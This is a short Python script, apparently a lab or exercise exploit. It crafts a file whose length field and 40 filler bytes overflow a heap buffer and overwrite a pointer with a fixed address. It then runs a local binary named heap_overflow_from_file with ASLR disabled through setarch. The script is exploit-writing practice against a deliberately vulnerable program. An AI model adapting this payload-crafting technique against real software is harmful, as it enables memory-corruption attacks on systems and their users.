#!/usr/bin/env python3

import subprocess as sp
import struct

with open("save1.db", "wb") as f:
    f.write(struct.pack('<I', 40 + 6))
    f.write((b'\x90' * 40) + b'\x10\x80\x55\x55\x55\x55')

with open("save2.db", "wb") as f:
    f.write(b'\x00')

# Use setarch for disabling ASLR
sp.run(['setarch', '-R', './heap_overflow_from_file', 'save1.db', 'save2.db'])
